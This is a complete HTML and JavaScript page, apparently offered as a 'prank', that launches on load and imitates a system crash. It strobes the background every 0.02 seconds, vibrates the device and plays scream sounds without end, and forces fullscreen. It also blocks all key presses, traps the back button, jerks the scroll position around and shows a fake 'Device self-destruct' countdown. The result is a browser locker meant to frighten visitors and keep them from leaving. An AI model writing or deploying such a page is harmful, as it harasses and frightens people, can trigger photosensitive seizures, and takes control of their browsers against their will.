<!DOCTYPE html>
<html>
<head>
    <title>!! SYSTEM FAILURE !!</title>
    <style>
        body {
            background-color: black;
            color: red;
            font-family: 'Courier New', monospace;
            text-align: center;
            font-size: 32px;
            overflow: hidden;
            animation: glitchBg 0.02s infinite alternate;
        }

        @keyframes glitchBg {
            0% { background-color: black; color: red; }
            50% { background-color: red; color: white; }
            100% { background-color: black; color: red; }
        }

        .glitch-text {
            position: relative;
            animation: glitchText 0.02s infinite alternate;
        }

        @keyframes glitchText {
            0% { transform: translateX(-10px) translateY(-10px); text-shadow: -5px -5px 20px #ff0000; }
            100% { transform: translateX(10px) translateY(10px); text-shadow: 5px 5px 20px #ff0000; }
        }

        .error-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 50px;
            color: white;
            animation: textGlitch 0.05s infinite alternate;
        }

        @keyframes textGlitch {
            0% { text-shadow: -3px -3px red, 3px 3px blue; }
            100% { text-shadow: 3px 3px red, -3px -3px blue; }
        }
    </style>
    <script>
        function startPrank() {
            function vibrateLoop() {
                navigator.vibrate([100, 100, 100]);
                setTimeout(vibrateLoop, 500);
            }
            vibrateLoop();

            let sounds = [
                'https://www.myinstants.com/media/sounds/scream.mp3',
                'https://www.myinstants.com/media/sounds/fnaf-scream.mp3',
                'https://www.myinstants.com/media/sounds/horror-ambience.mp3',
                'https://www.myinstants.com/media/sounds/whisper.mp3'
            ];
            function playScarySound() {
                let audio = new Audio(sounds[Math.floor(Math.random() * sounds.length)]);
                audio.volume = 1.0;
                audio.play();
            }
            setInterval(playScarySound, 2000);

            function goFullScreen() {
                let elem = document.documentElement;
                if (elem.requestFullscreen) {
                    elem.requestFullscreen();
                } else if (elem.mozRequestFullScreen) {
                    elem.mozRequestFullScreen();
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                }
                document.addEventListener("keydown", function (event) {
                    event.preventDefault();
                });
            }
            goFullScreen();

            setInterval(() => {
                if (Math.random() > 0.7) {
                    let ghostImg = document.createElement("img");
                    ghostImg.src = "https://i.imgur.com/zl4grfF.png";
                    ghostImg.style.position = "fixed";
                    ghostImg.style.top = `${Math.random() * 100}%`;
                    ghostImg.style.left = `${Math.random() * 100}%`;
                    ghostImg.style.width = "100px";
                    ghostImg.style.opacity = "0.7";
                    document.body.appendChild(ghostImg);
                    setTimeout(() => ghostImg.remove(), 500);
                }
            }, 3000);

            let countdown = 30;
            function showCountdown() {
                let countdownText = document.createElement("div");
                countdownText.className = "error-text";
                countdownText.innerHTML = `Device self-destruct in ${countdown} seconds...`;
                document.body.appendChild(countdownText);
                setTimeout(() => countdownText.remove(), 1000);
                countdown--;
                if (countdown > 0) setTimeout(showCountdown, 1000);
            }
            showCountdown();

            history.pushState(null, null, location.href);
            window.onpopstate = function () {
                history.go(1);
            };
            window.addEventListener('scroll', function(event) {
                event.preventDefault();
                window.scrollTo(0, 0);
            }, { passive: false });

            setInterval(() => {
                document.body.style.transform = `rotate(${Math.random() * 20 - 10}deg)`;
                document.body.style.filter = `blur(${Math.random() * 10}px)`;
                window.scrollTo(Math.random() * 500, Math.random() * 500);
            }, 200);

            setInterval(() => {
                window.scrollTo(Math.random() * window.innerWidth, Math.random() * window.innerHeight);
            }, 100);

            document.onmousemove = function (event) {
                event.preventDefault();
                window.scrollBy(Math.random() * 50 - 25, Math.random() * 50 - 25);
            };
        }
    </script>
</head>
<body onload="startPrank();">
    <h1 class="glitch-text">⚠ SYSTEM CRITICAL FAILURE ⚠</h1>
    <p>DEVICE LOCKDOWN INITIATED...</p>
</body>
</html>
